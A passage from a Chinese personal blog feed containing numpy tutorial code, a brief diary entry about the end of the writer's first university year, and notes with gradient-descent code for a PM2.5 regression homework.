class="comment">#  [21.0 32.0]]</span></span><br><span class="line">print(x * y)</span><br><span class="line">print(np.multiply(x, y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Elementwise division; both produce the array</span></span><br><span class="line"><span class="comment"># [[ 0.2         0.33333333]</span></span><br><span class="line"><span class="comment">#  [ 0.42857143  0.5       ]]</span></span><br><span class="line">print(x / y)</span><br><span class="line">print(np.divide(x, y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Elementwise square root; produces the array</span></span><br><span class="line"><span class="comment"># [[ 1.          1.41421356]</span></span><br><span class="line"><span class="comment">#  [ 1.73205081  2.        ]]</span></span><br><span class="line">print(np.sqrt(x))</span><br><span class="line"></span><br><span class="line">v = np.array([<span class="number">9</span>,<span class="number">10</span>])</span><br><span class="line">w = np.array([<span class="number">11</span>, <span class="number">12</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Inner product of vectors; both produce 219</span></span><br><span class="line">print(v.dot(w))</span><br><span class="line">print(np.dot(v, w))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Matrix / vector product; both produce the rank 1 array [29 67]</span></span><br><span class="line">print(x.dot(v))</span><br><span class="line">print(np.dot(x, v))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Matrix / matrix product; both produce the rank 2 array</span></span><br><span class="line"><span class="comment"># [[19 22]</span></span><br><span class="line"><span class="comment">#  [43 50]]</span></span><br><span class="line">print(x.dot(y))</span><br><span class="line">print(np.dot(x, y))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]])</span><br><span class="line"></span><br><span class="line">print(np.sum(x))  <span class="comment"># Compute sum of all elements; prints "10"</span></span><br><span class="line">print(np.sum(x, axis=<span class="number">0</span>))  <span class="comment"># Compute sum of each column; prints "[4 6]"</span></span><br><span class="line">print(np.sum(x, axis=<span class="number">1</span>))  <span class="comment"># Compute sum of each row; prints "[3 7]"</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([[<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">1</span>]])</span><br><span class="line">print(a)</span><br><span class="line"><span class="comment">#[[0 0]</span></span><br><span class="line"><span class="comment"># [1 1]]</span></span><br><span class="line">print(a.T)</span><br><span class="line"><span class="comment">#[[0 1]</span></span><br><span class="line"><span class="comment"># [0 1]]</span></span><br></pre></td></tr></table></figure><p>numpy完整的函数列表<br><a href="https://www.numpy.org.cn/reference/routines/math.html" target="_blank" rel="noopener">https://www.numpy.org.cn/reference/routines/math.html</a></p><h4 id="特殊运算符"><a href="#特殊运算符" class="headerlink" title="特殊运算符"></a>特殊运算符</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = np.arange(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">print(a.sum()) <span class="comment"># &gt;&gt;&gt;45</span></span><br><span class="line">print(a.min()) <span class="comment"># &gt;&gt;&gt;0</span></span><br><span class="line">print(a.max()) <span class="comment"># &gt;&gt;&gt;9</span></span><br><span class="line">print(a.cumsum()) <span class="comment"># &gt;&gt;&gt;[ 0  1  3  6 10 15 21 28 36 45] 这个大概是求前缀和数组吧</span></span><br></pre></td></tr></table></figure><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = np.arange(<span class="number">0</span>, <span class="number">100</span>, <span class="number">10</span>)</span><br><span class="line">indices = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">-1</span>]</span><br><span class="line">b = a[indices]</span><br><span class="line">print(a) <span class="comment"># &gt;&gt;&gt;[ 0 10 20 30 40 50 60 70 80 90]</span></span><br><span class="line">print(b) <span class="comment"># &gt;&gt;&gt;[10 50 90]</span></span><br></pre></td></tr></table></figure><h4 id="布尔屏蔽"><a href="#布尔屏蔽" class="headerlink" title="布尔屏蔽"></a>布尔屏蔽</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">a = np.linspace(<span class="number">0</span>, <span class="number">2</span> * np.pi, <span class="number">50</span>)</span><br><span class="line">b = np.sin(a)</span><br><span class="line">plt.plot(a,b)</span><br><span class="line">mask = b &gt;= <span class="number">0</span></span><br><span class="line">plt.plot(a[mask], b[mask], <span class="string">'bo'</span>)</span><br><span class="line">mask = (b &gt;= <span class="number">0</span>) &amp; (a &lt;= np.pi / <span class="number">2</span>)</span><br><span class="line">plt.plot(a[mask], b[mask], <span class="string">'go'</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>做出来的图满足b数组对应&gt;=0，a数组对应&lt;=pi/2</p><h4 id="整数数组索引"><a href="#整数数组索引" class="headerlink" title="整数数组索引"></a>整数数组索引</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>], [<span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># An example of integer array indexing.</span></span><br><span class="line"><span class="comment"># The returned array will have shape (3,) and</span></span><br><span class="line">print(a[[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]])  <span class="comment"># Prints "[1 4 5]"</span></span><br><span class="line"></span><br><span class="line">print(a[[<span class="number">0</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">1</span>]]) <span class="comment"># [2 6]</span></span><br><span class="line"></span><br><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>], [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]])</span><br><span class="line"></span><br><span class="line">print(a)  <span class="comment"># prints "array([[ 1,  2,  3],</span></span><br><span class="line">          <span class="comment">#                [ 4,  5,  6],</span></span><br><span class="line">          <span class="comment">#                [ 7,  8,  9],</span></span><br><span class="line">          <span class="comment">#                [10, 11, 12]])"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create an array of indices</span></span><br><span class="line">b = np.array([<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select one element from each row of a using the indices in b</span></span><br><span class="line">print(a[np.arange(<span class="number">4</span>), b])  <span class="comment"># Prints "[ 1  6  7 11]"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Mutate one element from each row of a using the indices in b</span></span><br><span class="line">a[np.arange(<span class="number">4</span>), b] += <span class="number">10</span></span><br><span class="line"></span><br><span class="line">print(a)  <span class="comment"># prints "array([[11,  2,  3],</span></span><br><span class="line">          <span class="comment">#                [ 4,  5, 16],</span></span><br><span class="line">          <span class="comment">#                [17,  8,  9],</span></span><br><span class="line">          <span class="comment">#                [10, 21, 12]])</span></span><br></pre></td></tr></table></figure><h4 id="布尔数组索引"><a href="#布尔数组索引" class="headerlink" title="布尔数组索引"></a>布尔数组索引</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>], [<span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">bool_idx = (a &gt; <span class="number">2</span>)   <span class="comment"># Find the elements of a that are bigger than 2;</span></span><br><span class="line">                     <span class="comment"># this returns a numpy array of Booleans of the same</span></span><br><span class="line">                     <span class="comment"># shape as a, where each slot of bool_idx tells</span></span><br><span class="line">                     <span class="comment"># whether that element of a is &gt; 2.</span></span><br><span class="line"></span><br><span class="line">print(bool_idx)      <span class="comment"># Prints "[[False False]</span></span><br><span class="line">                     <span class="comment">#          [ True  True]</span></span><br><span class="line">                     <span class="comment">#          [ True  True]]"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We use boolean array indexing to construct a rank 1 array</span></span><br><span class="line"><span class="comment"># consisting of the elements of a corresponding to the True values</span></span><br><span class="line"><span class="comment"># of bool_idx</span></span><br><span class="line">print(a[bool_idx])  <span class="comment"># Prints "[3 4 5 6]"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We can do all of the above in a single concise statement:</span></span><br><span class="line">print(a[a &gt; <span class="number">2</span>])     <span class="comment"># Prints "[3 4 5 6]"</span></span><br></pre></td></tr></table></figure><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>])   <span class="comment"># Let numpy choose the datatype</span></span><br><span class="line">print(x.dtype)         <span class="comment"># Prints "int64"</span></span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">1.0</span>, <span class="number">2.0</span>])   <span class="comment"># Let numpy choose the datatype</span></span><br><span class="line">print(x.dtype)             <span class="comment"># Prints "float64"</span></span><br><span class="line"></span><br><span class="line">x = np.array([<span class="number">1</span>, <span class="number">2</span>], dtype=np.int64)   <span class="comment"># Force a particular datatype</span></span><br><span class="line">print(x.dtype)                         <span class="comment"># Prints "int64"</span></span><br></pre></td></tr></table></figure><h4 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># We will add the vector v to each row of the matrix x,</span></span><br><span class="line"><span class="comment"># storing the result in the matrix y</span></span><br><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>], [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]])</span><br><span class="line">v = np.array([<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">y = np.empty_like(x)   <span class="comment"># Create an empty matrix with the same shape as x</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add the vector v to each row of the matrix x with an explicit loop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    y[i, :] = x[i, :] + v</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now y is the following</span></span><br><span class="line"><span class="comment"># [[ 2  2  4]</span></span><br><span class="line"><span class="comment">#  [ 5  5  7]</span></span><br><span class="line"><span class="comment">#  [ 8  8 10]</span></span><br><span class="line"><span class="comment">#  [11 11 13]]</span></span><br><span class="line">print(y)</span><br></pre></td></tr></table></figure><p>在Python中显式循环会比较慢<br>另一种等价的方法很快速<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># We will add the vector v to each row of the matrix x,</span></span><br><span class="line"><span class="comment"># storing the result in the matrix y</span></span><br><span class="line">x = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>], [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]])</span><br><span class="line">v = np.array([<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line">vv = np.tile(v, (<span class="number">4</span>, <span class="number">1</span>))   <span class="comment"># Stack 4 copies of v on top of each other</span></span><br><span class="line">print(vv)                 <span class="comment"># Prints "[[1 0 1]</span></span><br><span class="line">                          <span class="comment">#          [1 0 1]</span></span><br><span class="line">                          <span class="comment">#          [1 0 1]</span></span><br><span class="line">                          <span class="comment">#          [1 0 1]]"</span></span><br><span class="line">y = x + vv  <span class="comment"># Add x and vv elementwise</span></span><br><span class="line">print(y)  <span class="comment"># Prints "[[ 2  2  4</span></span><br><span class="line">          <span class="comment">#          [ 5  5  7]</span></span><br><span class="line">          <span class="comment">#          [ 8  8 10]</span></span><br><span class="line">          <span class="comment">#          [11 11 13]]"</span></span><br></pre></td></tr></table></figure></p><hr><p>看到这差不多不影响使用了<br>后面遇到什么再补充好了</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.numpy.org.cn/index.html" target="_blank" rel="noopener">https://www.numpy.org.cn/index.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> note </tag>
            
            <tag> numpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190722</title>
      <link href="/blog/20190722/"/>
      <url>/blog/20190722/</url>
      
        <content type="html"><![CDATA[<p>今天有些难受，有点头疼…</p><p>好久没有写这样的文章了..<br>给自己放了一个双休，回来找找同学，聊聊天，开个黑<br>然后我又玩小号虐菜去了…自己原先会玩的几个英雄全改了，瑞兹菲兹啥的，有些难受，青铜局真的容易让人心态爆炸233，我杀就完事了，但队友不会打劣势，只会被滚雪球（我说这个干嘛<br>今天 is study time，又去翻了翻之前同学的Blog，发现大家好像都不大写了…也不知道大家现在都怎么样，都在做些什么<br>我写Blog的习惯已经养成好久了，之前不知道是为了什么，有时候就觉得做了道题，写个题解，似乎挺好，但是自己也不怎么会回头看。而笔记类的Blog就还好，自己如果有忘记的可以回去查一下，但是一些笔记是面向我自己的，别人看来可能会有些乱，跳跃太大之类的…咱也没辙</p><p>大一这么快就结束了，感觉自己也有很多地方没有做好，也在看着身边人的变化<br>一年过去，我觉得我变帅了（雾<br>感觉对自己有好处的事情都会去做会去尝试一下，感觉我不是那么功利吧，哪怕不知道能得到什么的事情也是会去做的<br>自己的英语实在是太差了…也有很多没尽到自己的责任<br>这一年也对<strong>能力越大，责任越大</strong>这句话有了新的理解，有时候被安排上完全本不属于我的事情，表面上答应的很爽，但大家都知道这么热个天，我一个新闻宣传部的还要去管签到…<br>有时候就感觉这句话是承担责任多的人的自勉和安慰，是承担少的人的借口和推脱</p><p>有些东西还是不写好…不然说不定就有人翻到这篇Blog了呢</p><p>大二加油，感觉事情还是挺多的。</p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习练习</title>
      <link href="/blog/ml-practice/"/>
      <url>/blog/ml-practice/</url>
      
        <content type="html"><![CDATA[<p>本来想着放在笔记后面，后来发现好像问题有点多…决定新开一篇文章来写</p><h2 id="hw1"><a href="#hw1" class="headerlink" title="hw1"></a>hw1</h2><p><a href="https://www.kaggle.com/c/ml2019spring-hw1/overview" target="_blank" rel="noopener">https://www.kaggle.com/c/ml2019spring-hw1/overview</a><br><a href="https://ntumlta2019.github.io/ml-web-hw1/" target="_blank" rel="noopener">作业说明</a></p><p>我一开始做了一个非常naive的model，反正分开处理，Python用的也不是很熟练，就当练代码了<br>一开始没用AdaGrad，发现Learning Rate真的很难设置<br>如果数据量小，那么Learning Rate应该大一些，如果数据量大，那就得小一些了，这个都是相对的<br>如果数据本身小，那么初始值就没那么重要，如果本身大的话，那初始值就需要自己手动设置一下了<br>举个第一个的栗子，如果一开始初始值都设成0,12960条数据，一开始得到的Loss就有51361098.87099994，Learning Rate我设成了1e-8，得到的结果还越来越大…<br>当我把数据量调小一点，比如20条这个样子，还是有点用的…Learning Rate = 1e-6，迭代50次大概能得到一个不错的结果…<br>实测<code>1e-9,1e-12</code>时有点用了…<br>我忽然有个大胆的想法…如果前面变化大点后面变化小点是不是很科学，可以飞快接近结果<br>p.s. Python的输出调试真的不好用…不如c++的<code>#define debug(x) cout&lt;&lt;#x&lt;&lt;&quot;=&quot;&lt;&lt;x&lt;&lt;endl</code>，可能我还没get到该技能<br>原来只需要预测PM2.5就行了，那我直接写全得了<br>一开始Loss=<code>4231600.00</code>，最后<code>313187.27500353276</code></p><p>现在我不是很清楚要什么时候结束…所以先直接计次循环了<br>先在这保存一下代码…之后改成AdaGrad<br>果然这个naive的程序得到了<code>private:9.66107 public:8.18926</code>的高分，我觉得以后应该把训练的模块和输出模块分开来写，不然必须训练一次才能输出233<br>第一次训练出来的w和b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">w = [<span class="number">0.02560433358938389</span>, <span class="number">0.012801930896077247</span>, <span class="number">0.004710981594648449</span>, <span class="number">0.005885507375027003</span>, <span class="number">0.009942499746330985</span>, <span class="number">0.026670961533262413</span>, <span class="number">-0.0010603121145215564</span>, <span class="number">0.25976948883940576</span>, <span class="number">0.6202885065990642</span>]</span><br><span class="line">b = <span class="number">0.01483973260431497</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># read data</span></span><br><span class="line"></span><br><span class="line">ff = open(<span class="string">'train.csv'</span>, <span class="string">'r'</span>, <span class="keyword">True</span>, <span class="string">'big5hkscs'</span>);</span><br><span class="line">data_init = ff.readlines()</span><br><span class="line">total_line = len(data_init)<span class="number">-1</span></span><br><span class="line"><span class="comment"># total_line = 19</span></span><br><span class="line">total_type = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">data = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(total_type)]</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, total_line+<span class="number">1</span>): </span><br><span class="line">    <span class="comment"># print(i, data_init[i], end=' ')</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data_init[i].split(<span class="string">','</span>)[<span class="number">3</span>:]: </span><br><span class="line">        <span class="comment"># print(j, end=' ')</span></span><br><span class="line">        <span class="keyword">if</span>(j.startswith(<span class="string">"NR"</span>)):</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(<span class="number">0.0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(float(j))</span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in data:</span></span><br><span class="line"><span class="comment">#     print(len(i))</span></span><br><span class="line"></span><br><span class="line">ff.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># init model without adagrad</span></span><br><span class="line"><span class="comment"># just consider one type</span></span><br><span class="line">learningrate = <span class="number">1e-11</span></span><br><span class="line">w = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line">b = <span class="number">0</span></span><br><span class="line">par = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># data[0]=data[0][:20]</span></span><br><span class="line"><span class="comment"># print(data[0])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a)</span>:</span> <span class="comment"># calc y</span></span><br><span class="line">    y = b</span><br><span class="line">    <span class="comment"># print(len(a))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(a)):</span><br><span class="line">        y += w[i]*a[i]</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LF</span><span class="params">()</span>:</span> <span class="comment"># loss function</span></span><br><span class="line">    tot1, tot2 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">0</span>])<span class="number">-1</span>):</span><br><span class="line">        tot1 += data[<span class="number">0</span>][i]-f(data[<span class="number">0</span>][i<span class="number">-9</span>: i])</span><br><span class="line">        tot2 += (data[<span class="number">0</span>][i]-f(data[<span class="number">0</span>][i<span class="number">-9</span>: i]))**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> tot1, tot2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpart</span><span class="params">()</span>:</span> <span class="comment"># get partial w_i,b</span></span><br><span class="line">    <span class="keyword">global</span> w,b,learningrate</span><br><span class="line">    parw = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>)]</span><br><span class="line">    parb = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">0</span>])<span class="number">-1</span>):</span><br><span class="line">        a = data[<span class="number">0</span>][i<span class="number">-9</span>: i]</span><br><span class="line">        tmp = data[<span class="number">0</span>][i]-f(a)</span><br><span class="line">        <span class="comment"># print('a = ', a, ' tmp = ', tmp, 'f(a) = ', f(a))</span></span><br><span class="line">        parb += <span class="number">-2</span>*(tmp)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(parw)):</span><br><span class="line">            parw[j] += <span class="number">-2</span>*tmp*a[j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(parw, parb)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        w[i]=w[i]-learningrate*parw[i]</span><br><span class="line">    b = b-learningrate*parb</span><br><span class="line"></span><br><span class="line"><span class="comment"># main loop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    loss1, loss2 = LF()</span><br><span class="line">    print(loss2)</span><br><span class="line">    getpart()</span><br><span class="line">    <span class="comment"># print(w, b, learningrate, end=' -&gt; ')</span></span><br></pre></td></tr></table></figure><p>其实我觉得浮点数精度带来的误差还是很大的…<br>今天跑不完了，明早起来再跑吧233</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># read data</span></span><br><span class="line"></span><br><span class="line">ff = open(<span 